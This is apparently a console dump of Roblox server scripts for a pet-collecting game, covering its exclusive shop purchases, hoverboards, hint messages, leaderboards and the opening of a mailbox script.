end)]]--  -  Editar
  04:54:13.767    -  Editar
  04:54:13.767  ----- [2330] ServerScriptService.Scripts.Game.ExclusiveShop -----  -  Editar
  04:54:13.768  --------|     Setting     |--------
local salePet = "1022"

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Can Purchase 15 Pets Equipped").OnInvoke = function(plyr)
    local save = _L.Saving.Get(plyr)
    if not save then
        return nil
    end
    
    if not _L.Gamepasses.Owns(plyr, _L.Directory.Gamepasses["8 Pets Equipped"].ID) then
        return false, "You need to buy the 8 Pets Equipped pass first. Would you like to buy it now?"
	end
    
    if 15 <= save.MaxEquipped then
        return false, "You already own 15 Pets Equipped."
	end
		
    return true
end

_L.Signal.Invoked("Can Buy 15 Pets Equipped").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return nil
	end

	if not _L.Gamepasses.Owns(plyr, _L.Directory.Gamepasses["8 Pets Equipped"].ID) then
		return false 
	end

	if 15 <= save.MaxEquipped then
		return false 
	end

    return true
end

_L.Network.Invoked("Can Purchase Octuple Eggs").OnInvoke = function(plyr)
    local save = _L.Saving.Get(plyr)
    if not save then
        return nil
    end

	if not _L.Gamepasses.Owns(plyr, _L.Directory.Gamepasses["Triple Egg Open"].ID) then
        return false, "You need to buy the triple egg pass first. Would you like to buy it now?"
    end
    
    if save.OwnsOctupleEggs then
        return false, "You already own Octuple Eggs Open."
	end
	
    return true
end

_L.Signal.Invoked("Can Buy Octuple Eggs").OnInvoke = function(plyr)
    local save = _L.Saving.Get(plyr)
    if not save then
        return nil
    end

	if not _L.Gamepasses.Owns(plyr, _L.Directory.Gamepasses["Triple Egg Open"].ID) then
        return false
    end

    if save.OwnsOctupleEggs then
        return false 
    end

    return true
end 

function giveGamepass(plr: instance, gamepass: string): boolean
	local dir = _L.Directory.Gamepasses[gamepass]
	if not dir then
		return nil
	end
	
	pcall(function()
		_L.Gamepasses.Give(plr, dir.ID)
	end)
	
	return true
end

function isGamepass(gamepass: string): boolean
	return _L.Directory.Gamepasses[gamepass]~=nil
end

function buyExclusive(plr: instance, amount: number): boolean
	local s = _L.Saving.Get(plr)
	
	pcall(function()
		for i = 1, amount or 1 do
			_L.Pets.Create(plr, salePet, nil)
		end
	end)
	
	task.spawn(function()
		task.delay(1.5, function()
			_L.Network.Fire("Notification", plr, "(x"..amount..") Exclusive Egg added to inventory!", {
				color = Color3.fromRGB(221, 85, 255), 
				force = true
			})
		end)
	end)
	
	return true
end

function buyBoostPack(plr: instance): boolean
	pcall(function()
		_L.Boosts.Give(plr, "Ultra Lucky", 140)
		_L.Boosts.Give(plr, "Super Lucky", 340)
		_L.Boosts.Give(plr, "Triple Coins", 260)
		_L.Boosts.Give(plr, "Triple Damage", 260)
	end)
	return true
end

function buyProduct(plr: instance, product: string): boolean
	--warn("------------------PRODUCT: DIR------------------")
	local dir = _L.Directory.Products[product]
	if not dir then
		return nil
	end
	--warn("------------------PRODUCT: DIR------------------")
	
	--warn("------------------PRODUCT: RETURN------------------")
	return dir.Callback(plr, {})
end

_L.Network.Invoked("Exclusive Shop Purchase").OnInvoke = function(plr: instance, p: string): boolean 
	p = tostring(p)
	
	--warn("------------------SAVE------------------")
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	--warn("------------------SAVE------------------")
	
	--warn("------------------SHARED------------------")
	local data = _L.Shared.Purchasables[p]
	if not data then
		return nil
	end
	--warn("------------------SHARED------------------")
	
	--warn("------------------COST------------------")
	if data.Cost > save["Paw Tokens"] then
		return false, "You need ".._L.Functions.Commas(data.Cost-save["Paw Tokens"]).." more Paw Tokens!"
	end
	--warn("------------------COST------------------")
	
	--warn("------------------REQUIRES------------------")
	if data.Requires then
		if not save.PurchasedPurchasables[data.Requires] then
			return false, "You need "..data.Requires.." first!"
		end
	end
	--warn("------------------REQUIRES------------------")

	--warn("------------------OWNS------------------")
	if save.PurchasedPurchasables[p] and not data.inf then
		return false
	end
	--warn("------------------OWNS------------------")
	
	--warn("------------------MISC------------------")
	save["Paw Tokens"] = save["Paw Tokens"] - data.Cost
	save.SpentPawTokens = save.SpentPawTokens + data.Cost
	if save.PurchasedPurchasables[p] then
		save.PurchasedPurchasables[p] = save.PurchasedPurchasables[p] + 1
	else
		save.PurchasedPurchasables[p] = 1
	end	
	--warn("------------------MISC------------------")
	
	--warn("------------------GIVEREWARD------------------")
	if data.class == "Gamepass"  then
	--	warn("------------------GAMEPASS------------------")
		return giveGamepass(plr, p)
	elseif data.class == "Boost" then
	--	warn("------------------BOOST------------------")
		return _L.Boosts.Give(plr, p, data.Cost)
	elseif data.class == "ExclusiveEgg" then
	--	warn("------------------EGG------------------")
		return buyExclusive(plr, data.Amount)
	elseif data.class == "BoostBundle" then
	--	warn("------------------BUNDLE------------------")
		return buyBoostPack(plr)
	elseif data.class == "Product" then
	--	warn("------------------PRODUCT------------------")
		return buyProduct(plr, p)
	end
	--warn("------------------GIVEREWARD------------------")
	
	--warn("------------------NIL???------------------")
	return nil
end

_L.Network.Invoked("Can Buy 100 Eggs").OnInvoke = function(player)
	local save = _L.Saving.Get(player)
	if save then 
		return save.SpentPawTokens >= 100
	end
	return nil
end
   -  Editar
  04:54:13.768    -  Editar
  04:54:13.768  ----- [2331] ServerScriptService.Scripts.Game.EDITED | TestScripts -----  -  Editar
  04:54:13.768  local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()
if not _L.RunService:IsStudio() then
	return
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	player.Chatted:Connect(function(msg)
		if msg == "test spin" then
			_L.Network.Fire("Spin Wheel", player, 4)
		elseif msg == "test egg" then
			_L.Eggs.Open(player, "Cracked Egg", 1, { { "1", 100 } }, { {["r"] = true} }, true, true)
		elseif msg == "test rap" then
			_L.RAP.Update({
				["id"] = "1";
				["g"] = false;
				["r"] = false;
				["dm"] = false;
				["sh"] = false;
			}, 10_000_000_000)
		elseif msg == "test f2p" then
			print(_L.Signal.Invoke("Calculate Gamepass Rewards", player))
		end
	end)
end)  -  Editar
  04:54:13.768    -  Editar
  04:54:13.768  ----- [2332] ServerScriptService.Scripts.Game.Hoverboards -----  -  Editar
  04:54:13.768  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Fired("Update Hoverboard State"):Connect(function(player)
	
	
	if player:GetAttribute("UsingHoverboard") == true then
		player:SetAttribute("UsingHoverboard", false)
	else
		player:SetAttribute("UsingHoverboard", true)
	end
end)


_L.Network.Invoked("Equip Hoverboard").OnInvoke = function(player, hoverboard)
	hoverboard  =  tostring(hoverboard)

	local save = _L.Saving.Get(player) 
	if (not save) then
		return 
	end

	if (not _L.Functions.SearchArray(save.Hoverboards, hoverboard)) then
		return false, "You do not own this hoverboard!"
	end

	save.EquippedHoverboard = hoverboard

	return true
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	local allHoverboards = {}
	for i, v in pairs(game.ReplicatedStorage.__DIRECTORY.Hoverboards:GetChildren()) do
		table.insert(allHoverboards, v.name)
    end
    
   --9-- while not _L.Network.Invoke("Has Loaded", player, player) do
   --     _L.Heartbeat(2)
    --end
	_G.HasLoaded(player)
	
	while wait(5) do
		if not player or not player.Parent then
			break
		end
		for i, v in pairs(allHoverboards) do
			local dir = _L.Directory.Hoverboards[v]
            if dir then
                local owns = dir.callback(player) or false
                if owns == true then
                    coroutine.wrap(function()
                        _G.UnlockHoverboard(player, tostring(v))
                    end)()
                end
            end
        end
	end
end)

_L.Network.Invoked("Give Purple Hoverboard").OnInvoke = function(player)
    if not _L.Shared.IsHardcore then
        return false 
    end

    local save = _L.Saving.Get(player) 
    if not save then 
        return nil 
    end
    
    if not table.find(save.Hardcore.AreasUnlocked, "Town") then 
        return false 
    end

    return _G.UnlockHoverboard(player, "Purple")
end

_L.Network.Invoked("Give High Tech Hoverboard").OnInvoke = function(player)
    if not _L.Shared.IsHardcore then 
        return false
    end

    local save = _L.Saving.Get(player) 
    if not save then
        return nil 
    end
    
    if not table.find(save.Hardcore.AreasUnlocked, "Alien Chest") then
        return false 
    end

    return _G.UnlockHoverboard(player, "High Tech")
end

_L.Network.Invoked("Give Doodle Hoverboard").OnInvoke = function(player)
    if not _L.Shared.IsHardcore then 
        return false 
    end

    local save = _L.Saving.Get(player) 
    if not save then 
        return nil 
    end
    
    if not table.find(save.Hardcore.AreasUnlocked, "Doodle Barn") then
        return false
    end

    return _G.UnlockHoverboard(player, "Doodle")
end  -  Editar
  04:54:13.768    -  Editar
  04:54:13.768  ----- [2333] ServerScriptService.Scripts.Game.ServerMessages -----  -  Editar
  04:54:13.768  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
local hintColor = Color3.fromRGB(147, 221, 204)
local hintPrefix = "[Hint] "

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local RNG = Random.new()
local hints = {
	[[🏅 Achievements are a quick & easy way to earn Diamonds!]],
	[[🎁 Earn gifts & rewards every day just by playing!]],
	[[👍 Enjoying the game? Give us an honest rating! It helps us a lot.]],
	[[🏷️ Equip 8 pets instead of 4, available in the Exclusive Shop!]],
	[[🖌️ Fanart contributors get a unique chat tag!]],
	[[✅ Follow @BIGCopies on Twitter for news and updates!]],
	[[⚙️ Lagging? Try turning off 'Show Other Pets' in the Settings menu!]],
	[[✨ Legendary, Mythical, and Secret pets come with random enchantments!]],
	[[🏷️ LIMITED TIME ONLY - Exclusive pets are available in the Exclusive Shop!]],
	[[🏷️ Magic Eggs gives you the chance to hatch rainbow and golden pets! Available now in the Exclusive Shop!]],
	[[🏷️ Need a LUCKY edge? Purchase the Ultra Lucky boost in the Exclusive Shop, available now!]],
	[[🏷️ Open eggs faster with the Egg Skip pass, available now in the Exclusive Shop!]],
	[[🏷️ Ride around on a sick hoverboard, available now in the Exclusive Shop!]],
	[[🌎 There is a global leaderboard that actively shows the top players from around the globe!]],
	[[🌎 The top 100 players in the world get a unique chat tag!]],
	[[🏷️ Take out more pets at once, available in the Exclusive Shop!]],
	[[✨ Upgrade pets to Dark Matter in the Tech World!]],
	[[🏷️ Want to significantly increase your odds of hatching Mythical pets? Mythical Hunter is available now in the Exclusive Shop!]],
	[[🏷️ Want to open 3 eggs at once? The Triple Eggs pass is available now in the Exclusive Shop!]],
	[[🏷️ Wish you could teleport? The Teleport pass is available now in the Exclusive Shop!]],
	[[Be on the lookout for rare chests! They are huge and drop tons of coins!]],
	[[Boosts are given to high-ranked players, every day, for FREE!]],
	[[Did you know you can send trades using the chat? Try typing "/trade Player"!]],
	[[Found any exploits/bugs? Report it on our Discord Server!]],
	[[Got a lot of extra pets? Fuse them using the Fuse Pets Machine!]],
	[[Secret pets are the best pets in the game! They are also the rarest pets you can hatch.]],
	[[There are several worlds you can travel to. Have you visited them all?]],
	[[Use the Golden Pets Machine to convert normal pets to golden pets!]],
	[[You can upgrade your walk speed, diamond rewards, orb reach, and more!]],
	[[You can get free boosts and diamonds every day just by having a high rank!]],
	[[You can convert golden pets into rainbow pets using the Rainbow Machine!]],
	[[Wow! Did you know that you can buy plushies for special rewards in game?]],
}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

--local minutes = 30
local t = {900,1800}
_L.Signal.Fired("Player Added"):Connect(function(plyr)
	coroutine.wrap(function()  
		while task.wait(math.random(unpack(t))) do  
			if not plyr or plyr.Parent then
				break
			end

			local RNGINT = RNG:NextInteger(1, #hints)
			_L.Network.Fire("Chat Msg", plyr, hintPrefix..hints[RNGINT], hintColor)
		end
	end)()
end)  -  Editar
  04:54:13.768    -  Editar
  04:54:13.768  ----- [2334] ServerScriptService.Scripts.Game.Leaderboard -----  -  Editar
  04:54:13.768  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local globalDB = _L.DataStoreService:GetOrderedDataStore("global" .. _L.Settings.StatsVersion)
local localLeaderboardData = {}
local globalLeaderboardData = {}
local serverGlobalData = {}
local cache = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function calcRAP(plyr)
    local save = _L.Saving.Get(plyr)
    if not save then
        return 0
    end
    
    local power = 0
    
    -- 
    
    return power
end 

coroutine.wrap(function()
    while wait(2) do
        local a = {}
        
        for i, v in pairs(game.Players:GetPlayers()) do
            table.insert(a, {
                player = v,
                level = calcRAP(v)
            })
        end
        
        localLeaderboardData = a
        table.sort(localLeaderboardData, function(i, v)
            return i.level > v.level
        end)
        
        a = nil
    end
end)()

_L.Network.Invoked("Get Local Leaderboard").OnInvoke = function(plyr)
	table.sort(localLeaderboardData, function(i, v)
		return i.level > v.level
	end)
    return localLeaderboardData
end

coroutine.wrap(function()
    local function convert()
        local recentData
        local err = "???"
        
        for i = 1, 3 do
            if recentData ~= nil then
                break
            end
            local dat
            local success, err = pcall(function()
                dat = globalDB:GetSortedAsync(false, 100):GetCurrentPage()
            end)
            if dat and success then
                recentData = dat
                break
            else
                wait(10)
            end
        end
        
        if not recentData and err then
            warn("global error : " .. err)
        end

        if recentData then
            local Converted = {}
            serverGlobalData = {}
            pcall(function()
                for Rank, Data in ipairs(recentData) do
                    if tonumber(Data.key) >= 1 then
                        local ID = Data.key
                        local name

                        pcall(function()
                            if cache[tostring(ID)] then
                                name = cache[tostring(ID)]
                            else
                                name = game.Players:GetNameFromUserIdAsync(ID)
                                cache[tostring(ID)] = name
                            end
                        end)

                        table.insert(Converted, {
                            level = math.floor(Data.value), 
                            username = name or "???"
                        })
                        
                        table.insert(serverGlobalData, {
                            rank = #serverGlobalData + 1,
                            id = tonumber(ID),
                        })
                    end
                    
                    _L.Heartbeat()
                end
            end)
            globalLeaderboardData = Converted
            _L.Variables.LoadedLB = true
        end
    end
    
    convert()
    
    while wait(30) do
        convert()
    end
end)()

local function save(plyr)
    local power = calcRAP(plyr)
    if power >= 25000 then
        local success, err = pcall(function()
            globalDB:SetAsync(plyr.UserId, power)
        end)
        
        if not success then
            warn("Error: ", err)
        end
    end    
end

_L.Network.Invoked("Get Global Leaderboard").OnInvoke = function(plyr)
    return globalLeaderboardData
end

_L.Signal.Invoked("Get Leaderboard Position").OnInvoke = function(plyr)
    for i, v in pairs(serverGlobalData) do
        if v.id == plyr.UserId then
            return v.rank or nil
        end
    end
    
	return nil
end

_L.Network.Invoked("Player Statues: Get Statue Data").OnInvoke = function(plyr, pool, pos)
    for _, dat in pairs(serverGlobalData) do
        if dat.rank == pos then
            return {userid = dat.id}
        end
    end
    
    return nil
end

_L.Signal.Fired("Player Added"):Connect(function(plyr)
    coroutine.wrap(function()
		while wait(80) do
			if not plyr or plyr.Parent then
				break
			end
            save(plyr)
        end
    end)()
end)

game.Players.PlayerRemoving:Connect(save)
game:BindToClose(function()
    for i, v in ipairs(game.Players:GetPlayers()) do
        save(v)
    end
end)  -  Editar
  04:54:13.768    -  Editar
  04:54:13.768  ----- [2335] ServerScriptService.Scripts.Game.Mailbox -----  -  Editar
  04:54:13.769  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     

	Re-scripted this 07/09-12/23 
				
--]]

--------|     Setting     |--------
local MailCost = 100000
local RequiredGameTime = 30 -- x seconds until you can use mail upon joining the server
local WaitTime = 3
local MinimumDiamonds = 10000
local MaxInbox = 100
local MailDelay = 1 -- dramatic delay

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local RunService = _L.RunService
local HttpService = _L.HttpService
local isStudio = RunService:IsStudio()
local Players = game:GetService("Players")

--------|    Variables    |--------
